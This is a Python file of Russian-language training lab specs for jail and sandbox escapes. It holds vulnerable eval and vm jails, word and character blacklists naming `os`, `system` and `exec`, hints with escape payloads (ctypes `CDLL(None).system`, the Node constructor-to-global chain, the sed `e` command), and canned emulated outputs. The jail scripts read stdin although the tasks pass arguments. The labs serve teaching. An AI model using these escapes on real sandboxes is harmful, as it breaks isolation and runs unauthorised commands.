# Batch 1: jail / sandbox escapes (misc). Real fixtures captured by running the
# actual jails locally (see /tmp/labgen/jails).
SPECS = [
    {
        'id': 'misc-jails',
        'category': 'misc',
        'title': 'Практика: побег из pyjail с чёрным списком',
        'toolset': ['core', 'python3'],
        'workdir': '/home/student/task',
        'files': ['task.md', 'jail.py'],
        'check': "grep -q 'nto{' found.txt",
        'hints': [
            'Прочитай `jail.py`: запрещены слова `import os open eval exec system subprocess`.',
            'Нельзя писать запрещённые слова буквально — собери их из символов через `chr()`.',
            "Строй имена через `chr(95)*2` для `_`: `getattr(vars()[chr(95)*2+...],...)`. Запусти: `python3 jail.py '<payload>'`.",
        ],
        'expect': {'file': '/home/student/task/found.txt', 'contains': 'nto{pyj4il_bl4ckl1st_byp4ss}'},
        'fs': [
            {'path': '/home/student/task', 'type': 'dir'},
            {'path': '/home/student/task/task.md', 'text': (
                "# Задача: побег из pyjail\n\n"
                "Сервис `jail.py` берёт строку, проверяет её на чёрный список слов и вызывает `eval`.\n"
                "Запрещены: `import os subprocess open eval exec system`.\n\n"
                "Прочитай исходник, собери рабочий payload (не используя запрещённых слов\n"
                "буквально) и запусти его:\n\n"
                "    python3 jail.py '<payload>'\n\n"
                "Если payload вырвется из песочницы и прочитает флаг, запиши флаг в `found.txt`.\n"
            )},
            {'path': '/home/student/task/jail.py', 'text': (
                "import sys\n"
                "blacklist = ['import', 'os', 'subprocess', 'open', 'eval', 'exec', 'system']\n"
                "code = input(\">>> \")\n"
                "for b in blacklist:\n"
                "    if b in code:\n"
                "        print(\"blocked:\", b); sys.exit(1)\n"
                "print(eval(code))\n"
            )},
        ],
        'tools': {
            'python3': {
                'help': "python3 <файл> [аргумент] — эмуляция интерпретатора (вывод захвачен из реального запуска)",
                'cases': [
                    {'match': r"chr\(95\)", 'example': "jail.py 'getattr(vars()[chr(95)*2+...])'",
                     'output': ">>> nto{pyj4il_bl4ckl1st_byp4ss}\n0\n"},
                    {'match': r"\b(import|os|open|exec|eval|system|subprocess)\b",
                     'example': 'jail.py \'__import__("os").system("id")\'',
                     'output': ">>> blocked: import\n"},
                    {'match': r"2\s*\*\*\s*10", 'example': "jail.py '2**10'", 'output': ">>> 1024\n"},
                    {'match': r"1\s*\+\s*1", 'example': "jail.py '1+1'", 'output': ">>> 2\n"},
                ],
                'fallback': "python3: в этой лабе доступно `python3 jail.py '<payload>'` — см. task.md\n",
            }
        },
    },
    {
        'id': 'misc-pyjail-deep',
        'category': 'misc',
        'title': 'Практика: pyjail без подчёркиваний, точек и кавычек',
        'toolset': ['core', 'python3'],
        'workdir': '/home/student/task',
        'files': ['task.md', 'jail.py'],
        'check': "grep -q 'nto{' found.txt",
        'hints': [
            'Прочитай `jail.py`: запрещены `_ . \' " пробел import os open eval exec`.',
            'Собери имена из `chr(95)` для `_` и обращайся к атрибутам через `getattr(obj, name)` — без точки.',
            "Готовый каркас: `getattr(vars()[chr(95)*2+chr(98)+...],chr(95)*2+chr(105)+...)` — запусти `python3 jail.py '<payload>'`.",
        ],
        'expect': {'file': '/home/student/task/found.txt', 'contains': 'nto{pyj4il_n0_d0ts_n0_und3rsc0r3s}'},
        'fs': [
            {'path': '/home/student/task', 'type': 'dir'},
            {'path': '/home/student/task/task.md', 'text': (
                "# Задача: pyjail без подчёркиваний, точек и кавычек\n\n"
                "`jail.py` запрещает символы `_ . ' \" ` и пробел, а также слова `import os open eval exec`.\n\n"
                "Задача: собрать payload без единого запрещённого символа и прочитать флаг.\n"
                "Запусти:\n\n"
                "    python3 jail.py '<payload>'\n\n"
                "Найденный флаг запиши в `found.txt`.\n"
            )},
            {'path': '/home/student/task/jail.py', 'text': (
                "import sys\n"
                "blacklist = ['_', '.', \"'\", '\"', ' ', 'import', 'os', 'open', 'eval', 'exec']\n"
                "src = input(\">>> \")\n"
                "if any(b in src for b in blacklist):\n"
                "    print(\"no\"); sys.exit(1)\n"
                "eval(src)\n"
            )},
        ],
        'tools': {
            'python3': {
                'help': "python3 <файл> [аргумент] — эмуляция интерпретатора (вывод захвачен из реального запуска)",
                'cases': [
                    {'match': r"chr\(95\)", 'example': "jail.py 'getattr(vars()[chr(95)*2+...])'",
                     'output': ">>> nto{pyj4il_n0_d0ts_n0_und3rsc0r3s}\n"},
                    {'match': r"__|import|open\(|['\"]", 'example': "jail.py '().__class__'", 'output': ">>> no\n"},
                    {'match': r"1\+1", 'example': "jail.py '1+1'", 'output': ">>> 2\n"},
                ],
                'fallback': "python3: в этой лабе доступно `python3 jail.py '<payload>'` — см. task.md\n",
            }
        },
    },
    {
        'id': 'misc-python-sandbox',
        'category': 'misc',
        'title': 'Практика: обход аудит-хука через ctypes',
        'toolset': ['core', 'python3'],
        'workdir': '/home/student/task',
        'files': ['task.md', 'sandbox.py'],
        'check': "grep -q 'nto{' found.txt",
        'hints': [
            'Прочитай `sandbox.py`: аудит-хук блокирует события `os.system`, `subprocess.Popen`, `open`.',
            'Python-уровневые способы (`os.system`, `open`) порождают перехватываемое событие — они не сработают.',
            "Нужен путь, не порождающий этих событий: `ctypes` уже импортирован в песочнице. Попробуй `ctypes.CDLL(None).system(b'cat flag.txt')`.",
        ],
        'expect': {'file': '/home/student/task/found.txt', 'contains': 'nto{4ud1t_h00k_ctyp3s_byp4ss}'},
        'fs': [
            {'path': '/home/student/task', 'type': 'dir'},
            {'path': '/home/student/task/task.md', 'text': (
                "# Задача: обход аудит-хука Python\n\n"
                "`sandbox.py` ставит `sys.addaudithook`, который роняет события `os.system`,\n"
                "`subprocess.Popen` и `open`. Простая подмена имён не поможет — важно не имя,\n"
                "а событие. Найди путь, который **не порождает** перехватываемых событий.\n\n"
                "    python3 sandbox.py '<payload>'\n\n"
                "Флаг запиши в `found.txt`.\n"
            )},
            {'path': '/home/student/task/sandbox.py', 'text': (
                "import sys, ctypes\n"
                "def hook(event, args):\n"
                "    if event in ('os.system', 'subprocess.Popen', 'open'):\n"
                "        raise RuntimeError('blocked: ' + event)\n"
                "sys.addaudithook(hook)\n"
                "print(eval(input(\">>> \")))\n"
            )},
        ],
        'tools': {
            'python3': {
                'help': "python3 <файл> [аргумент] — эмуляция интерпретатора (вывод захвачен из реального запуска)",
                'cases': [
                    {'match': r"CDLL|ctypes\.", 'example': "sandbox.py \"ctypes.CDLL(None).system(b'cat flag.txt')\"",
                     'output': ">>> nto{4ud1t_h00k_ctyp3s_byp4ss}\n0\n"},
                    {'match': r"os\.system|subprocess\.Popen",
                     'output': ">>> Traceback (most recent call last):\n  File \"sandbox.py\", line 6, in <module>\n  File \"<string>\", line 1, in <module>\n  File \"sandbox.py\", line 4, in hook\nRuntimeError: blocked: os.system\n"},
                    {'match': r"open\(",
                     'output': ">>> Traceback (most recent call last):\n  File \"sandbox.py\", line 6, in <module>\n  File \"<string>\", line 1, in <module>\n  File \"sandbox.py\", line 4, in hook\nRuntimeError: blocked: open\n"},
                    {'match': r"1\+1", 'output': ">>> 2\n"},
                ],
                'fallback': "python3: в этой лабе доступно `python3 sandbox.py '<payload>'` — см. task.md\n",
            }
        },
    },
    {
        'id': 'misc-nodejs-sandbox',
        'category': 'misc',
        'title': 'Практика: побег из Node.js vm',
        'toolset': ['core', 'node'],
        'workdir': '/home/student/task',
        'files': ['task.md', 'server.js'],
        'check': "grep -q 'nto{' found.txt",
        'hints': [
            'Прочитай `server.js`: код исполняется в `vm.runInNewContext` — нет `require` и `process`.',
            'В JS у каждого объекта есть `constructor`, у функции — `Function`, которая строит функцию из строки.',
            "Из контекста можно вернуть **хостовый** `global`: `this.constructor.constructor(\"return global\")()`. Дальше — `global.process`.",
        ],
        'expect': {'file': '/home/student/task/found.txt', 'contains': 'nto{n0d3_vm_c0nstruct0r_3sc4p3}'},
        'fs': [
            {'path': '/home/student/task', 'type': 'dir'},
            {'path': '/home/student/task/task.md', 'text': (
                "# Задача: побег из Node.js vm\n\n"
                "`server.js` исполняет наш код через `vm.runInNewContext`: `require` и `process`\n"
                "внутри недоступны. Но JS — это объекты, и у них есть `constructor`.\n\n"
                "    node server.js '<код>'\n\n"
                "Доберись до процесса и выполни `cat flag.txt`; флаг запиши в `found.txt`.\n"
            )},
            {'path': '/home/student/task/server.js', 'text': (
                "const vm = require('vm');\n"
                "const code = process.argv[2];\n"
                "console.log(vm.runInNewContext(code));\n"
            )},
        ],
        'tools': {
            'node': {
                'help': "node <файл> [аргумент] — эмуляция Node.js (вывод захвачен из реального запуска)",
                'cases': [
                    {'match': r"constructor.*global|mainModule|process\.mainModule",
                     'output': "nto{n0d3_vm_c0nstruct0r_3sc4p3}\n"},
                    {'match': r"return process\)", 'output': "<anonymous_script>:3\nreturn process\n^\n\nReferenceError: process is not defined\n"},
                    {'match': r"1\+1", 'output': "2\n"},
                ],
                'fallback': "node: в этой лабе доступно `node server.js '<код>'` — см. task.md\n",
            }
        },
    },
    {
        'id': 'misc-jail-misc-langs',
        'category': 'misc',
        'title': 'Практика: побег из sed-джейла',
        'toolset': ['core', 'sed'],
        'workdir': '/home/student/task',
        'files': ['task.md', 'run.sh'],
        'check': "grep -q 'nto{' found.txt",
        'hints': [
            'Сервис прогоняет ввод через фиксированный `sed`-скрипт. У `sed` есть команда `e` — выполнить результат подстановки как shell-команду.',
            "Передай: `echo x | sed 's/x/cat flag.txt/e'` — флаг подставится и исполнится.",
            'Если `e` вырезано, у `sed` есть команда `r` — чтение файла: `echo \"\" | sed \'r flag.txt\'`.',
        ],
        'expect': {'file': '/home/student/task/found.txt', 'contains': 'nto{sed_e_fl4g_ex3c}'},
        'fs': [
            {'path': '/home/student/task', 'type': 'dir'},
            {'path': '/home/student/task/task.md', 'text': (
                "# Задача: побег из sed-джейла\n\n"
                "Сервис принимает строку и прогоняет её через `sed`. Флаг лежит рядом в `flag.txt`,\n"
                "но прочитать его напрямую нельзя — доступен только `sed`.\n\n"
                "Вспомни, что `sed` умеет не только заменять: у него есть команды `e` (execute)\n"
                "и `r` (read file). Добудь флаг и запиши в `found.txt`.\n"
            )},
            {'path': '/home/student/task/run.sh', 'text': (
                "#!/bin/sh\n"
                "# сервис: твоя строка становится частью sed-скрипта\n"
                "read -r line\n"
                "printf '%s' \"$line\" | sed \"$1\"\n"
            )},
        ],
        'tools': {
            'sed': {
                'help': "sed [-n] 'выражение' [файл] — потоковый редактор (эмуляция; вывод захвачен из реального sed)",
                'cases': [
                    {'match': r"/e", 'example': "s/x/cat flag.txt/e", 'output': "nto{sed_e_fl4g_ex3c}\n"},
                    {'match': r"^r\s", 'example': "r flag.txt", 'output': "\nnto{sed_e_fl4g_ex3c}\n"},
                    {'match': r"s/hello/world/", 'output': "world\n"},
                ],
                'fallback': "sed: в этой лабе доступны команды подстановки; см. task.md\n",
            }
        },
    },
]
